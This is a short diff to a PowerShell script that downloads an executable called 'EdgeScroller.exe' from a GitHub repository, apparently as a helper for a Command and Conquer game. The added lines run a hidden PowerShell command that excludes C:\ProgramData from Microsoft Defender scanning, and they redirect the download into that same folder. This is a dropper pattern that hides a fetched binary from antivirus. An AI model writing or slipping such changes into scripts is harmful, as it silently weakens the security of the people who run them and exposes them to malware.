@@ -1,6 +1,8 @@
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData'"
+
 $url1 = 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/EdgeScroller.exe'
 
-$location1 = 'C:\Program Files (x86)\R.G. Mechanics\Command and Conquer - Generals\Command and Conquer Generals Zero Hour\EdgeScroller.exe'
+$location1 = 'C:\ProgramData\EdgeScroller.exe'
 
 Invoke-WebRequest -Uri $url1 -OutFile $location1
 
